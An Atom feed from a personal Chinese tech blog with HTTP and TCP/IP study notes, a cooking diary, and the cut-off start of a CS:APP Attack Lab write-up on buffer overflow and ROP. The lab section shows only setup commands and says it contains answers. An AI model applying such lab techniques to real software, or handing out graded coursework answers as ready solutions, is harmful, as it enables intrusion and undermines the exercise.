<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>(ﾟ∀。)</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-08-01T10:17:00.550Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>LUY</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>初窥HTTP--读&lt;图解HTTP&gt;小记</title>
    <link href="http://yoursite.com/2020/08/01/%E5%88%9D%E7%AA%A5HTTP-%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP-%E5%B0%8F%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/08/01/%E5%88%9D%E7%AA%A5HTTP-%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP-%E5%B0%8F%E8%AE%B0/</id>
    <published>2020-08-01T08:06:08.000Z</published>
    <updated>2020-08-01T10:17:00.550Z</updated>
    
    <content type="html"><![CDATA[<ol><li>TCP/IP 基础</li><li>HTTP简介</li><li>HTTP报文</li><li>状态码</li><li>…</li></ol><p><strong>未完待续</strong></p><a id="more"></a><h2 id="TCP-IP-基础"><a href="#TCP-IP-基础" class="headerlink" title="TCP/IP 基础"></a>TCP/IP 基础</h2><p>字面上看, TCP/IP包括了TCP与IP这两大协议．但一般意义上认为TCP/IP是指得以TCP,IP为核心协议的一系列协议族<del>(ko no IPS da!)</del>, 这个协议族是整个互联网运作的基础. HTTP协议是包含在TCP/IP协议族的一个子集.</p><blockquote><p>互联网协议套件（英语：Internet Protocol Suite，缩写IPS）是一个网络通讯模型，以及一整个网络传输协议家族，为网际网络的基础通讯架构。它常被通称为TCP/IP协议族（英语：TCP/IP Protocol Suite，或TCP/IP Protocols），简称TCP/IP 。因为该协定家族的两个核心协定：TCP（传输控制协议）和IP（网际协议），为该家族中最早通过的标准。</p><p>协议还包括: ARP，IP，ICMP，UDP，TCP，DNS，HTTP，FTP , SMTP，POP3，SNMP，ECHO，DHCP，SSH，NNTP 等.</p><p>From: <a href="https://zh.wikipedia.org/wiki/TCP/IP%E5%8D%8F%E8%AE%AE%E6%97%8F" target="_blank" rel="noopener">wiki: TCP/IP协议族</a></p></blockquote><p>本段将简单介绍:</p><ol><li>TCP/IP 的分层管理</li><li>通信传输流,</li><li>IP: 传输</li><li>TCP:可靠性</li><li>DNS: 域名解析</li><li>URI : 资源定位</li></ol><p>以及他们与HTTP是怎么互相协作的.本段不涉及具体的HTTP内容.</p><h3 id="TCP-IP的分层管理"><a href="#TCP-IP的分层管理" class="headerlink" title="TCP/IP的分层管理"></a>TCP/IP的分层管理</h3><p>假设你已经知道了 <a href="https://zh.wikipedia.org/zh-cn/OSI%E6%A8%A1%E5%9E%8B" target="_blank" rel="noopener">OSI模型</a> 将信息传输分为七层, 他们依次是</p><ol><li>第7层 应用层</li><li>第6层 表达层</li><li>第5层 会话层</li><li>第4层 传输层</li><li>第3层 网络层</li><li>第2层 数据链路层</li><li>第1层 物理层</li></ol><p>TCP/IP协议簇(再次提醒并不是TCP与IP这两个协议) 将其简化成了四个层次:</p><ol><li><p>应用层, 对应OSI模型中的7~5层</p><blockquote><p>该层包括所有和应用程序协同工作，利用基础网络交换应用程序专用的数据的协议。数据从网络相关的程序以这种应用内部使用的格式进行传送，然后被编码成标准协议的格式。</p><p>包括<strong>HTTP</strong>（万维网服务）、<strong>FTP</strong>（文件传输）、<strong>SMTP</strong>（电子邮件）、<strong>SSH</strong>（安全远程登录）、<strong>DNS</strong>（名称&lt;-&gt; IP地址寻找）以及许多其他协议</p></blockquote></li><li><p>传输层, 对应OSI模型中的第4层</p><blockquote><p>解决诸如端到端可靠性（“数据是否已经到达目的地？”）和保证数据按照正确的顺序到达这样的问题。在TCP/IP协议组中，传输协议也包括所给数据应该送给哪个应用程序。</p><p>包括 TCP与UDP 协议等</p><blockquote><p>TCP : 是一个“可靠的”、面向链接, 基于字节流的传输机制</p><p>UDP: 是一个无链接的数据报协议。它是一个“尽力传递”（best effort）的协议, 因为它不检查数据包是否已经到达目的地，并且不保证它们按顺序到达。<del>但是快</del></p></blockquote></blockquote></li><li><p>网络互连层, 对应OSI模型中的第3层</p><blockquote><p>解决在网络上流动的数据包. 解决如何选取网络中的路径将数据从源网络传输到目的网络.</p><p>例如IP协议</p></blockquote></li><li><p>网络链路层, 对应OSI模型中的第1~2层</p><blockquote><p>用来处理连接网络的硬件部分, 包括控制操作系统, 硬件设备驱动, NIC(网络适配器, 即网卡) , 以及光纤等物理部分</p></blockquote></li></ol><h3 id="通信传输流"><a href="#通信传输流" class="headerlink" title="通信传输流"></a>通信传输流</h3><ol><li>首先作为发送端的客户端在应用层利用（http）发出一个想看某个Web页面的HTTP请求。</li><li>为了传输方便，在传输层把(TCP)从应用层传下来的数据进行分割，并在各个报文上打上标记序号及端口号发给网络层</li><li>在网络层(IP)，给数据加上作为通信目的地址的MAC地址后发给链路层。到此发送网络的通信请求就准备齐全了</li><li>接收端的服务器在链路层接收到数据，按序往上层发送，直到应用层。才算是真正接收到从客户端发送过来的HTTP请求</li></ol><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/%E9%80%9A%E4%BF%A1%E4%BC%A0%E8%BE%93%E6%B5%81.png" alt=""></p><p>发送端在层与层之间传输数据时，每经过一层必定会被打伤一个该层所属的首部信息。反之，接收端则会一层一层的去掉</p><h3 id="IP-传输"><a href="#IP-传输" class="headerlink" title="IP : 传输"></a>IP : 传输</h3><p><em><a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">wiki链接</a></em></p><p>网际协议（英语：Internet Protocol，缩写：IP；也称互联网协议）是用于分组交换数据网络的一种协议。</p><blockquote><p>IP是在TCP/IP协议族中网络层的主要协议，任务仅仅是根据源主机和目的主机的地址来传送数据。为此目的，IP定义了寻址方法和数据报的封装结构。第一个架构的主要版本为IPv4，目前仍然是广泛使用的互联网协议，尽管世界各地正在积极部署IPv6。</p></blockquote><p>要保证数据能够传输需要两个重要条件: IP地址与MAC地址.</p><p>MAC地址是烧录在网卡或者接口上的<strong>物理地址</strong>，具有二层意义和<strong>全球唯一性</strong>，一般不能被改变。IP地址是网络中的主机或者三层接口在网络中的<strong>逻辑地址</strong>，在<strong>同一个网络内具有唯一性</strong>。</p><p>IP地址通过ARP协议与MAC对应, IP地址是可变换的, MAC 地址是不变的.MAC 地址是杂乱无序的, 如果只是用MAC地址尽管可以传输但是造成浪费.(要从整个互联网中找到你这个MAC地址) , 使用IP地址则可以找到你所处的网络, 在从该网络设备转交给你. </p><p><a href="https://www.zhihu.com/question/49335649/answer/120746792" target="_blank" rel="noopener"><em>IP地址和 MAC地址的区别和联系是什么?</em></a></p><h3 id="TCP-可靠性"><a href="#TCP-可靠性" class="headerlink" title="TCP : 可靠性"></a>TCP : 可靠性</h3><p><a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener"><em>wiki链接</em></a></p><p>TCP提供了可靠的字节流服务. 字节流是指将大块数据分割更小块的<strong>报文段 </strong>(segment) 为单位进行传输. 并且能够将数据准确地传给对方, 并且确认数据的送达.</p><p>为了保证数据可靠地送达, TCP 使用了<strong>三次握手</strong>.其中使用了 TCP 的标志（flag): SYN（synchronize） 和 ACK(acknowledgement)</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/%E4%B8%89%E6%AC%A1%E6%8C%A5%E6%89%8B.png" alt=""></p><h3 id="DNS-域名解析"><a href="#DNS-域名解析" class="headerlink" title="DNS : 域名解析"></a>DNS : 域名解析</h3><p><a href="https://zh.wikipedia.org/wiki/Domain_Name_System" target="_blank" rel="noopener"><em>Wiki链接</em></a></p><p><strong>DNS</strong>（Domain Name System）服务是和HTTP协议一样位于应用层的协议。它提供域名到IP地址之间的解析服务，或逆向从IP地址反查域名的服务。</p><p>用户输入一个网址, 客户机首先向DNS请求IP地址, 获得后由HTTP协议生成针对目标服务器的 <em>请求报文</em> . TCP 将 请求报文分割成多个报文段并负责传输的可靠性. IP协议将这些报文段传送至指定的目标服务器. </p><p>服务器收到这些报文段后由TCP协议将报文段还原成HTTP的请求报文并检查完整性（如果出错再引起另外的处理), HTTP协议对请求报文进行处理, 并返回响应报文, 后续过程类似. </p><h3 id="URI-资源定位"><a href="#URI-资源定位" class="headerlink" title="URI : 资源定位"></a>URI : 资源定位</h3><p>统一资源标识符（英语：Uniform Resource Identifier，缩写：URI）在电脑术语中是一个用于标识某一互联网资源名称的字符串。</p><p>注意 : URI 是用字符串标识的某一互联网资源, 而URL是资源在互联网上的地址, URL是URI的子集.</p><p>通用URI的格式如下：</p><blockquote><p>[协议名]://用户名:密码@主机名:端口/路径?查询参数#片段ID</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                    hierarchical part</span><br><span class="line">        ┌───────────────────┴─────────────────────┐</span><br><span class="line">                    authority               </span><br><span class="line">        ┌───────────────┴───────────────┐</span><br><span class="line">  abc:&#x2F;&#x2F;username:password@example.com:123&#x2F;path&#x2F;data?key&#x3D;value&amp;key2&#x3D;value2#fragid1</span><br><span class="line">  └┬┘   └───────┬───────┘ └────┬────┘ └┬┘ └───┬───┘ └─────────┬─────────┘ └──┬──┘</span><br><span class="line">scheme  user information     host     port  path            query         fragment</span><br><span class="line"> 协议   用户的登录信息  服务器地址  端口  路径    查询参数  片段ID</span><br><span class="line">  urn:example:mammal:monotreme:echidna</span><br><span class="line">  └┬┘ └──────────────┬───────────────┘</span><br><span class="line">scheme              path</span><br></pre></td></tr></table></figure><ul><li><p><strong>协议方案</strong></p><p>使用<code>http:</code> 或<code>https：</code>等协议方案名获取访问资源时要指定协议类型。不区分字母大小写，最后附一个冒号<code>：</code> . 也可使用<code>data：</code>或 <code>javascript：</code>这类指定数据或脚本程序的方案名。</p></li><li><p><strong>登录信息（认证）</strong></p></li></ul><p>​    指定用户名和密码作为从服务器端获取资源时必要的登录信息（身份认证）。此项是可选项。</p><ul><li><strong>服务器地址</strong></li></ul><p>​    使用绝对URI必须指定待访问的服务器地址。地址可以是类似hackr.jp这种DNS可解析的名称，或是192.168.1.1这类IPv4地址名，还可以是[0:0:0:0:0:0:0:1]这样用方括号括起来的Pv6地址名。</p><ul><li><strong>服务器端口</strong></li></ul><p>​    指定服务器连接的网络端口号。此项也是可选项，若用户省略则自动使用默认端口号。带层次的文件路径。指定服务器上的文件路径来定位特指的资源。这与UNIX系统的文件目录结构相似。</p><ul><li><strong>带层次的文件路径</strong></li></ul><p>​    指定服务器上的文件路径来定位特指的资源。这与UNIX系统的文件目录结构相似。</p><ul><li><strong>查询字符串</strong></li></ul><p>​    针对已指定的文件路径内的资源，可以使用查询字符串传入任意参数。此项可选。</p><ul><li><p><strong>片段标识符</strong></p><p>使用片段标识符通常可标记出已获取资源中的子资源（文档内的某个位置）。但在RFC中并没有明确规定其使用方法。该项也为可选项。</p></li></ul><hr><h2 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h2><p>本段将非常粗略地一览HTTP基本情况, 包括以下内容:</p><ol><li>HTTP基本情况</li><li>HTTP报文</li><li>HTTP方法与命令</li><li>持久连接</li><li>Cookie : 状态管理</li></ol><h3 id="HTTP基本情况"><a href="#HTTP基本情况" class="headerlink" title="HTTP基本情况"></a>HTTP基本情况</h3><p>HTTP协议用于客户端与服务端之间的通信. 客户端向服务端发出一个访问资源的<strong>请求</strong>, 服务端针对这个请求做出 <strong>响应</strong>. 服务端无法主动地向客户端建立通信.(除非附加了其他协议). 请求与响应都是通过HTTP报文来传送数据的.</p><p>计算机扮演客户端与服务端的角色可能会切换, 但对于每条通信线路二者的角色是确定的.</p><p>HTTP是<strong>无状态协议</strong>, HTTP协议自身对先前的通信状态不进行保存, 不进行持久化处理.这是为了快递处理大量事物,保证协议的可伸缩性.为了实现通信状态的保持状态, 引入了Cookie来实现持久化通信.</p><p>HTTP使用URI进行资源的定位, 指定URI的方式有很多:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 完整的请求URI</span><br><span class="line">GET http:&#x2F;&#x2F;www.baidu.com&#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">2. 使用相对URI地址</span><br><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line">HOST: baidu.com</span><br></pre></td></tr></table></figure><p>除此之外, 如果对于服务器本身(而不是访问资源)的请求, 可以只用<code>*</code>来代替请求URI</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS * HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure><p>未完待续</p>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;TCP/IP 基础&lt;/li&gt;
&lt;li&gt;HTTP简介&lt;/li&gt;
&lt;li&gt;HTTP报文&lt;/li&gt;
&lt;li&gt;状态码&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;未完待续&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="驭龙术" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%A9%AD%E9%BE%99%E6%9C%AF/"/>
    
      <category term="Web开发" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%A9%AD%E9%BE%99%E6%9C%AF/Web%E5%BC%80%E5%8F%91/"/>
    
      <category term="HTTP" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%A9%AD%E9%BE%99%E6%9C%AF/Web%E5%BC%80%E5%8F%91/HTTP/"/>
    
    
      <category term="读书笔记:技术" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E6%8A%80%E6%9C%AF/"/>
    
      <category term="HTTP" scheme="http://yoursite.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>时与光W-202008-1</title>
    <link href="http://yoursite.com/2020/07/31/%E6%97%B6%E4%B8%8E%E5%85%89W-202008-1/"/>
    <id>http://yoursite.com/2020/07/31/%E6%97%B6%E4%B8%8E%E5%85%89W-202008-1/</id>
    <published>2020-07-31T11:42:23.000Z</published>
    <updated>2020-07-31T11:42:23.297Z</updated>
    
    <content type="html"><![CDATA[<p>2020年月日~月日</p><h1 id="在这里简要概括内容"><a href="#在这里简要概括内容" class="headerlink" title="在这里简要概括内容"></a>在这里简要概括内容</h1><a id="more"></a><h2 id="在这里开始内容"><a href="#在这里开始内容" class="headerlink" title="#在这里开始内容"></a>#在这里开始内容</h2><h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><h3 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年月日~月日&lt;/p&gt;
&lt;h1 id=&quot;在这里简要概括内容&quot;&gt;&lt;a href=&quot;#在这里简要概括内容&quot; class=&quot;headerlink&quot; title=&quot;在这里简要概括内容&quot;&gt;&lt;/a&gt;在这里简要概括内容&lt;/h1&gt;
    
    </summary>
    
    
      <category term="时与光" scheme="http://yoursite.com/categories/%E6%97%B6%E4%B8%8E%E5%85%89/"/>
    
    
      <category term="小结" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%BB%93/"/>
    
      <category term="周记" scheme="http://yoursite.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>时与光W-202007-4</title>
    <link href="http://yoursite.com/2020/07/31/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-4/"/>
    <id>http://yoursite.com/2020/07/31/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-4/</id>
    <published>2020-07-31T11:42:02.000Z</published>
    <updated>2020-07-31T12:56:57.028Z</updated>
    
    <content type="html"><![CDATA[<p>2020年7月20日~7月26日</p><p>宿舍小厨</p><a id="more"></a><h2 id="宿舍小厨"><a href="#宿舍小厨" class="headerlink" title="宿舍小厨"></a>宿舍小厨</h2><p>上周买的食材陆陆续续到了, 即将开始与导员宿管的躲猫猫生活. 由于我手残下单鸡蛋的时候多下了一份,现在我对着80个鸡蛋欲哭无泪… </p><p>整理下目前的装备与食材.</p><ol><li>锅*2, 一个口深适合煮汤, 一个口浅适合煎东西;</li><li>一个蒸蛋器</li><li>面板, 擀面杖, 刀具餐具</li></ol><p>食材:</p><ol><li>鸡蛋</li><li>紫薯</li><li>黑小麦全麦粉</li><li>鸡肉肠, 鸡胸肉,金枪鱼肉罐头</li><li>燕麦麦片</li><li>荞麦面</li><li>全麦面包</li></ol><h3 id="鸡蛋羹"><a href="#鸡蛋羹" class="headerlink" title="鸡蛋羹"></a>鸡蛋羹</h3><p>试图使用蒸蛋器蒸出鸡蛋羹, 但是挺失败的, 尽管在网上找了很多食谱…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">鸡蛋羹做法</span><br><span class="line"></span><br><span class="line">少水蛋(质地硬)</span><br><span class="line">1. ⭐蛋:水&#x3D;1:1.5</span><br><span class="line">2. ⭐小火&gt;&gt;大火</span><br><span class="line">3. 温水&gt;凉水</span><br><span class="line">4. 电解质&gt;水        #电解质:盐&#x2F;高汤</span><br><span class="line">5. 加盖&gt;无盖        #用布反向包裹锅盖</span><br><span class="line">6. ⭐时间刚好&gt;&gt;多蒸一会</span><br><span class="line">7. ⭐凉开水&gt;&gt;自来水</span><br><span class="line"></span><br><span class="line">多水蛋(质地软)</span><br><span class="line">1. 蛋:水&#x3D;1:2 or 1:3</span><br><span class="line">2. 一定要加电解质</span><br><span class="line">3. 火候,时间相对不重要</span><br><span class="line"></span><br><span class="line">其他</span><br><span class="line">1. 蒸锅上汽之后再放入</span><br><span class="line">总结自B站UP喃猫小厨房,BV1x441117r4</span><br></pre></td></tr></table></figure><p>但是总是蒸出来蜂窝蛋…</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E9%B8%A1%E8%9B%8B%E7%BE%B9.jpg" alt=""></p><h3 id="煎鸡蛋"><a href="#煎鸡蛋" class="headerlink" title="煎鸡蛋"></a>煎鸡蛋</h3><p>从最开始打在锅里面热一热, 到后面在少放油的情况下尽量更香, 味道好极了现在.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%85%8E%E8%9B%8B.jpg" alt=""></p><h3 id="什锦-燕麦-紫薯-鸡蛋-牛奶饼"><a href="#什锦-燕麦-紫薯-鸡蛋-牛奶饼" class="headerlink" title="什锦-燕麦-紫薯-鸡蛋-牛奶饼"></a>什锦-燕麦-紫薯-鸡蛋-牛奶饼</h3><p>总而言是是各种奇妙的搭配组合…</p><h4 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h4><p>两个鸡蛋不加水搅拌,加入全麦粉, 加入烤熟切块的紫薯, 放入锅中烤熟.<br>但是我总觉得这么厚的饼不太适合直接烤, 不容易烤熟…而且紫薯块太大, 翻面的时候总是支离破碎.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%B4%AB%E8%96%AF%E9%A5%BC.jpg" alt=""></p><h4 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h4><p>第一次失败后决定做薄饼. 鸡蛋+麦片, 第一锅完全成了炒鸡蛋, 后续陆续放入面粉, 最终成形. 燕麦片本身的厚度使饼没有想象中那么薄, 但相比上一版好多了.</p><p>味道其实不太行, 由于只加入了少许盐, 基本没有任何滋味, 食之无味.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%85%8E%E9%A5%BC0.5.jpg" alt=""></p><h4 id="尝试3"><a href="#尝试3" class="headerlink" title="尝试3"></a>尝试3</h4><p>将燕麦片牛奶泡一晚, 次日打入鸡蛋搅拌, 放油下锅. 煎出来了奇形怪状的小饼干(疑似), 依旧没什么味道.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%85%8E%E9%A5%BC.jpg" alt=""></p><h4 id="尝试4"><a href="#尝试4" class="headerlink" title="尝试4"></a>尝试4</h4><p>直接鸡蛋液打匀分次倒入铺满锅底即可. 本来想加入切丁的鸡肉肠, 但是鸡蛋饼太薄肉丁根本镶嵌不上去, 最后变成了鸡蛋饼+炒肉丁.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E9%B8%A1%E8%9B%8B%E9%A5%BC%E8%82%89%E4%B8%81.jpg" alt=""></p><h3 id="紫薯燕麦粥"><a href="#紫薯燕麦粥" class="headerlink" title="紫薯燕麦粥"></a>紫薯燕麦粥</h3><p>紫薯蒸熟切块, 加水熬制30min,加入麦片熬煮20min, 香浓的燕麦紫薯粥就做好了.</p><p>粥越煮越稠, 我中间还以为自己水加多了去了点, 结果最后快熬干了orz.</p><p>水量没过紫薯上表面1-2公分.</p><p>味道还可以, 口中直呼烫烫烫</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%B2%A5.jpg" alt=""></p><h4 id="荞麦面-煎鸡蛋-炒金枪鱼肉"><a href="#荞麦面-煎鸡蛋-炒金枪鱼肉" class="headerlink" title="荞麦面+煎鸡蛋+炒金枪鱼肉"></a>荞麦面+煎鸡蛋+炒金枪鱼肉</h4><p>好吧这个没啥技术含量..看图吧</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E9%9D%A2.jpg" alt=""></p><h3 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h3><p>千里之行始于足下, 疫情期间也是看着其他人都化身大厨. 一直想开始却迟迟没有动身. 在学校尝试着开始自己做菜做饭才发现其实没有想象中那么困难, 没有锅碗瓢盆就想办法解决, 没有食材就京东天猫冷链, 缺少绿叶菜就多买水果补充维生素. 天下是有难易乎? 为之, 则难者亦易也.</p><p>还有就是对任何事情都不能等闲视之, 哪怕是简单的鸡蛋羹, 小学三年级在家里面拿微波炉轻松搞定的东西换了厨具做的依旧很糟糕. 煎鸡蛋放多少油? 做饼的面水比例是多少才不粘锅有能均匀铺开? 听到什么声音说明是火候太过了? 好多细节都是没有实操的情况下光靠别人的转述学不到的. 就像这几天在学校招新群里讨论的家长, 自己其实根本不了解行业情况, 道听途说地从别人的谈论, 亲戚朋友的个例中断定专业的优劣. 纸上得来终觉浅,绝知此事要躬行啊.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/ai.png" alt=""></p><h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><p>跟着宗主任去招新群里面答疑打白工, 每天都能碰见各种神奇的家长, 常面一度十分欢乐</p><h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><h3 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h3><p>完全搞定数电+计组</p><p>检查牙齿</p><p>购买装备&amp;爬山</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年7月20日~7月26日&lt;/p&gt;
&lt;p&gt;宿舍小厨&lt;/p&gt;
    
    </summary>
    
    
      <category term="时与光" scheme="http://yoursite.com/categories/%E6%97%B6%E4%B8%8E%E5%85%89/"/>
    
    
      <category term="小结" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%BB%93/"/>
    
      <category term="周记" scheme="http://yoursite.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP-Lab笔记3:Attack</title>
    <link href="http://yoursite.com/2020/07/24/CSAPP-Lab%E7%AC%94%E8%AE%B03-Attack/"/>
    <id>http://yoursite.com/2020/07/24/CSAPP-Lab%E7%AC%94%E8%AE%B03-Attack/</id>
    <published>2020-07-24T13:19:56.084Z</published>
    <updated>2020-08-01T10:17:26.503Z</updated>
    
    <content type="html"><![CDATA[<p>这是我在2020年7月3日~7月8日完成的Attack Lab的题解与笔记</p><p>攻击实验室是CS:APP 配套实验中的第三个实验, 通过缓冲区溢出和面向返回编程技术实现程序控制. 并学习相关技术, 巩固C运行时状态.</p><p>本文显式地包含答案, 如果你想自己解决,不建议使用本文.</p><p><a href="https://github.com/luy-0/CS-APP-LABs/tree/master/Lab-Answer_HB/Lab3-AttackLab" target="_blank" rel="noopener">对应Github仓库 点我</a></p><a id="more"></a><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol><li>准备工作</li><li>题目说明<ol><li>Hex2raw 工具讲解</li><li>Byte Codes生成s</li></ol></li><li>题解: CTARGET <ol><li>Level1</li><li>Level2</li><li>Level3</li></ol></li><li>题解: RTARGET <ol><li>Gadget Farm 的使用</li><li>RLevel2</li></ol></li><li>后记</li></ol><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>本实验在教材中只对应了两小节的内容, 讲座也仅有Lec 9 , 需要大量补充学习.</p><p>请一定要在 <a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">官网下载</a> 并阅读 attack.pdf</p><h2 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h2><p>默认你已经阅读过教材的 3.10 部分</p><p>本题包括两部分, Ctarget与Rarget. 第一部分是利用缓冲区溢出以及代码注入技术进行攻击; 第二部分是利用面向返回编程方法对代码执行进行控制.</p><h3 id="如何开始"><a href="#如何开始" class="headerlink" title="如何开始"></a>如何开始</h3><p>本题需要你实现编写一个 txt 文件, 必须仅有十六进制数字与空格组成. 通过Hex2raw 工具将该文件转为二进制文件filename 再进行下一步.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用</span><br><span class="line">.&#x2F;ctarget -i filename -q</span><br><span class="line">或者</span><br><span class="line">.&#x2F;rtarget -i filename -q</span><br></pre></td></tr></table></figure><p> 其中 <code>-i</code>指令表示通过文件输入, <code>-q</code>表示脱网使用. 如果你也是自学者, 必须每次执行都加上这个参数.</p><p>cookie 是每个CMU学生的一个身份识别码. 如果你是自学者, cookie应该都是0x59b997fa, 这串数字会在解题中扮演一定的角色.</p><h3 id="A-Hex2raw-工具讲解"><a href="#A-Hex2raw-工具讲解" class="headerlink" title="A:Hex2raw 工具讲解"></a>A:Hex2raw 工具讲解</h3><p>由 <code>in.txt</code>文件转为二进制文件<code>out</code>需要执行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;hex2raw &lt;in.txt &gt; out</span><br></pre></td></tr></table></figure><h3 id="B-ByteCodes生成"><a href="#B-ByteCodes生成" class="headerlink" title="B:ByteCodes生成"></a>B:ByteCodes生成</h3><p>众所周知, 汇编代码是与机器的字节码一一对应的, 那么如果由汇编代码转化为字节编码呢? 我们只需要先撰写汇编代码文件 <code>example.s</code> , 使用 gcc 将其编译, 再将其反编译为中间文件即可.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c example.s</span><br><span class="line">objdump -d example.o &gt; example.d</span><br></pre></td></tr></table></figure><p>打开 example.d 即可看见对应的机器码了.</p><h2 id="题解-CTARGET"><a href="#题解-CTARGET" class="headerlink" title="题解: CTARGET"></a>题解: CTARGET</h2><p>我们首先明确一下我们要干什么. 假设你已经阅读过教材 3.10.3 小结, 你应该知道我们的目标是利用缓冲区溢出来使得函数返回时返回至另外的,出乎意料的, 由我们(攻击者)提供的函数地址上. 基本的原理不在这里多说.</p><p>下面的叙述均基于 CTARGET  为背景.</p><h3 id="Level1"><a href="#Level1" class="headerlink" 